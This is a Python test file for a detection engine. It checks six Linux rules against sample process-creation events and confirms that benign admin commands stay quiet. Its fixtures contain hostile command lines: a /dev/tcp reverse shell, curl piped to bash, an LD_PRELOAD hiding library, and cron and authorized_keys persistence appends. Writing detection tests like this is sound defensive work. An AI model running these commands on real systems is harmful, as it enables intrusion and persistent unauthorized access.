"""Linux telemetry fixture: exercises the six rules/linux_process/ rules
against representative Linux process_create events. Schema 0.4
(panopticon-manager's Linux procfs telemetry, see
docs/LINUX_TELEMETRY_SCHEMA_0_4.md there) reuses this same process_create
event shape -- source.kind differs, not the process/parent fields these
rules match on -- so these fixtures are representative of what the engine
actually receives from a Linux endpoint, not a synthetic shape invented for
this test.
"""
from panopticon_detection.evaluator.engine import RuleEvaluator
from panopticon_detection.rules.loader import RuleLoader


def _evaluator():
    rules = RuleLoader().load_directory("rules")
    return RuleEvaluator(rules)


def _fired_ids(evaluator, event):
    return {result.rule.id for result in evaluator.evaluate_event(event)}


def test_det_lnx_001_fires_on_dev_tcp_reverse_shell():
    event = {
        "event_id": "lnx-001",
        "event_type": "process_create",
        "process": {"name": "bash", "pid": 4110, "command_line": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"},
        "parent": {"name": "sshd", "pid": 900},
    }
    assert "DET-LNX-001" in _fired_ids(_evaluator(), event)


def test_det_lnx_002_fires_on_shell_spawned_by_web_server():
    event = {
        "event_id": "lnx-002",
        "event_type": "process_create",
        "process": {"name": "sh", "pid": 5210, "command_line": "sh -c id"},
        "parent": {"name": "php-fpm", "pid": 1200},
    }
    assert "DET-LNX-002" in _fired_ids(_evaluator(), event)


def test_det_lnx_003_fires_on_inline_ld_preload():
    event = {
        "event_id": "lnx-003",
        "event_type": "process_create",
        "process": {
            "name": "ls",
            "pid": 6001,
            "executable": "/bin/ls",
            "command_line": "LD_PRELOAD=/tmp/.hide.so ls -la /root",
        },
        "parent": {"name": "bash", "pid": 4001},
    }
    assert "DET-LNX-003" in _fired_ids(_evaluator(), event)


def test_det_lnx_004_fires_on_crontab_edit_and_direct_append():
    evaluator = _evaluator()
    edit_event = {
        "event_id": "lnx-004a",
        "event_type": "process_create",
        "process": {"name": "crontab", "pid": 7001, "command_line": "crontab -e"},
        "parent": {"name": "bash", "pid": 4002},
    }
    append_event = {
        "event_id": "lnx-004b",
        "event_type": "process_create",
        "process": {"name": "bash", "pid": 7002, "command_line": "echo '* * * * * /tmp/x' >> /etc/cron.d/x"},
        "parent": {"name": "bash", "pid": 4002},
    }
    assert "DET-LNX-004" in _fired_ids(evaluator, edit_event)
    assert "DET-LNX-004" in _fired_ids(evaluator, append_event)


def test_det_lnx_005_fires_on_authorized_keys_append():
    event = {
        "event_id": "lnx-005",
        "event_type": "process_create",
        "process": {
            "name": "bash",
            "pid": 8001,
            "command_line": "echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> /root/.ssh/authorized_keys",
        },
        "parent": {"name": "bash", "pid": 4003},
    }
    assert "DET-LNX-005" in _fired_ids(_evaluator(), event)


def test_det_lnx_006_fires_on_curl_pipe_bash():
    event = {
        "event_id": "lnx-006",
        "event_type": "process_create",
        "process": {"name": "bash", "pid": 9001, "command_line": "curl -sSL https://example.com/install.sh | bash"},
        "parent": {"name": "bash", "pid": 4004},
    }
    assert "DET-LNX-006" in _fired_ids(_evaluator(), event)


def test_benign_linux_admin_activity_triggers_no_linux_rule():
    evaluator = _evaluator()
    benign_events = [
        {
            "event_id": "lnx-benign-1",
            "event_type": "process_create",
            "process": {"name": "ls", "pid": 100, "command_line": "ls -la /var/log"},
            "parent": {"name": "bash", "pid": 50},
        },
        {
            "event_id": "lnx-benign-2",
            "event_type": "process_create",
            "process": {"name": "crontab", "pid": 101, "command_line": "crontab -l"},
            "parent": {"name": "bash", "pid": 50},
        },
        {
            "event_id": "lnx-benign-3",
            "event_type": "process_create",
            "process": {"name": "curl", "pid": 102, "command_line": "curl -sSL https://example.com/status.json"},
            "parent": {"name": "bash", "pid": 50},
        },
        {
            "event_id": "lnx-benign-4",
            "event_type": "process_create",
            "process": {"name": "sh", "pid": 103, "command_line": "sh -c 'systemctl status nginx'"},
            "parent": {"name": "cron", "pid": 1},
        },
    ]
    for event in benign_events:
        fired = {rule_id for rule_id in _fired_ids(evaluator, event) if rule_id.startswith("DET-LNX")}
        assert fired == set(), f"{event['event_id']} unexpectedly fired {fired}"
